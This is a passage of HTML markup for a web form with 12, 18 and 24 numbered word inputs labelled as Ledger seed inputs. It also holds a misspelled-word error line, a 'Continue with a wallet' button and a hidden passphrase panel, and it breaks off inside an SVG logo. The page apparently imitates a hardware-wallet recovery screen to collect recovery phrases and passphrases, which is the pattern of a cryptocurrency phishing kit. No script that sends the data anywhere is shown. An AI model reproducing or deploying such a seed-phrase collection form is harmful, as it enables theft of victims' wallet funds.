                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            1
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] ledger-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            2
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] ledger-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            3
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] ledger-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            4
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] ledger-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            5
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] ledger-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            6
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] ledger-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            7
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] ledger-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            8
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] ledger-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            9
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] ledger-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            10
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] ledger-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            11
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] ledger-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            12
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] ledger-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                  </div>
                  <div
                    id="ledger-18"
                    class="ledger-container-18-words scwtw-grid scwtw-grid-cols-3 scwtw-gap-1 scwtw-mt-1 scwtw-hidden"
                  >
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            13
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] ledger-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            14
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] ledger-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            15
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] ledger-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            16
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] ledger-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            17
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] ledger-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            18
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] ledger-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                  </div>
                  <div
                    id="ledger-24"
                    class="ledger-container-24-words scwtw-grid scwtw-grid-cols-3 scwtw-gap-1 scwtw-mt-1 scwtw-hidden"
                  >
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            19
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] ledger-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            20
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] ledger-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            21
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] ledger-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            22
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] ledger-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            23
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] ledger-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
                        <div>
                          <p
                            class="font-inter scwtw-text-[#202020] dark:scwtw-text-[#ffffff] scwtw-text-[14px] scwtw-font-normal"
                          >
                            24
                          </p>
                        </div>
                      </div>
                      <input
                        class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] hover:scwtw-border-[#9d9d9d] dark:hover:scwtw-border-[#c6c6c6] scwtw-bg-transparent focus:scwtw-bg-[#fbfbfb] dark:focus:scwtw-bg-[#0f0f0f] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-border-[#ff5252] dark:data-[invalid=true]:scwtw-border-[#b83939] data-[invalid=true]:scwtw-text-[#fa3434] dark:data-[invalid=true]:scwtw-text-[#fa4646b5] ledger-seed-input"
                        type="text"
                        data-invalid="false"
                      />
                    </div>
                  </div>
                </div>
                <div
                  class="scwtw-my-2 scwtw-ease-in-out scwtw-transition-all scwtw-duration-400 scwtw-text-start scwtw-opacity-0"
                  id="ledger-error-container"
                >
                  <span
                    class="font-inter scwtw-text-[#ff5f52] scwtw-font-normal scwtw-text-[14px]"
                    >1 word is invalid or misspelled</span
                  >
                </div>
              </div>
              <div
                class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-gap-x-1 scwtw-mt-4"
              >
                <div class="scwtw-w-full">
                  <button
                    class="scwtw-w-full scwtw-text-[#ffffff] scwtw-bg-[#202020] dark:scwtw-text-[#ffffff] dark:scwtw-bg-[#ffffff05] scwtw-font-normal font-inter scwtw-text-[15px] scwtw-cursor-pointer scwtw-rounded-[16px] scwtw-h-[48px] hover:scwtw-opacity-90 scwtw-transition-all scwtw-duration-300 disabled:scwtw-opacity-50 disabled:scwtw-cursor-not-allowed"
                    id="ledger-import-button"
                  >
                    Continue with a wallet
                  </button>
                </div>
              </div>
            </div>
            <div
              id="passphrase-container"
              class="scwtw-z-[2147483648] scwtw-transition-opacity scwtw-duration-500 scwtw-opacity-0 scwtw-hidden scwtw-px-6 scwtw-py-8"
            >
              <div class="scwtw-flex scwtw-items-center scwtw-justify-between">
                <div>
                  <svg
                    class="scwtw-h-[35px] scwtw-w-auto"
                    width="249"
                    height="48"
                    viewBox="0 0 249 48"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
